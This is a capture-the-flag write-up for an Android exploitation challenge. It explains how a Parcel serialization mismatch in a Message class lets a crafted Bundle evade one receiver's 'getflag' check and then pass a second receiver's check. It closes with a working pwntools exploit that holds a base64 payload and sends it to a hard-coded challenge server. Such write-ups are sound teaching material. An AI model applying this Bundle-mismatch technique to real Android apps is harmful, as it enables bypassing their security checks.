## BroadCastTest
[中文](./README_zh.md) [English](./README.md)
[attachment](./BroadcastTest.apk)

This chall is an android pwn
The vulnerability is about the mismatch between serialization and deserialization
This chall is mainly inspired by CVE-2017-13311, etc.

You can read this article https://weekly-geekly.github.io/articles/457558/index.html, which details the cause of similar vulnerabilities

In the apk, it first read the Base64 string, then base64deocde the data and put it as a Bundle in the broadcast, send it to Receiver2
Receiver2 receives the broadcast, takes out the Bundle, and then takes out a string which key is "command" from the bundle, and determines whether it is getflag,
If not, the Receiver2 will continue to broadcast the data to Receiver3
Receiver3 receives the broadcast, takes out the Bundle, check whether the command is getflag, if so, it outputs "Congratulation"

We cannot pass this check in a normal way, but there is a com.de1ta.broadcasttest.MainActivity $ Message class in the apk, where the serialization and deserialization do not match

In Receiver2, checking whether the command is "getflag" will cause the Bundle to be deserialized. When it is sent to Receiver3, it will be serialized again. Finally, Receiver3 will perform the last deserialization after receiving the Bundle.

Using the vulnerability, the string whose key is command cannot be obtained when it is deserialized in Receiver2. After serialization, the string with key as command and the value of getflag appears, and then the check of Receiver3 can pass, and finally get To flag

Below is the exp
```
from pwn import *
import base64
from hashlib import sha256
import itertools
import string
context.log_level = 'debug'

def proof_of_work(chal):
    #for i in itertools.permutations(string.ascii_letters+string.digits, 4):
    for i in itertools.permutations([chr(i) for i in range(256)], 4):
        sol = ''.join(i)
        if sha256(chal + sol).digest().startswith('\0\0\0'):
            return sol


a = 'SAEAAEJOREwDAAAACAAAAG0AaQBzAG0AYQB0AGMAaAAAAAAABAAAACwAAABjAG8AbQAuAGQAZQAxAHQAYQAuAGIAcgBvAGEAZABjAGEAcwB0AHQAZQBzAHQALgBNAGEAaQBuAEEAYwB0AGkAdgBpAHQAeQAkAE0AZQBzAHMAYQBnAGUAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAwAAAA0AAAA0AAAADQAAAAAAAAAHAAAAYwBvAG0AbQBhAG4AZAAAAAAAAAAHAAAAZwBlAHQAZgBsAGEAZwAAAAcAAABjAG8AbQBtAGEAbgBkAAAAAAAAAA0AAABQAGEAZABkAGkAbgBnAC0AVgBhAGwAdQBlAAAA'
b = base64.b64decode(a)
p = remote('206.189.186.98', 8848)
p.recvuntil('chal= ')
chal = p.recvuntil('\n')[:-1]
p.recvuntil('>>\n')
sol = proof_of_work(chal)
p.send(sol)
p.recvuntil('size')
p.sendline(str(len(b)))
p.recvuntil('please input payload:')
p.send(b)
p.interactive()
```
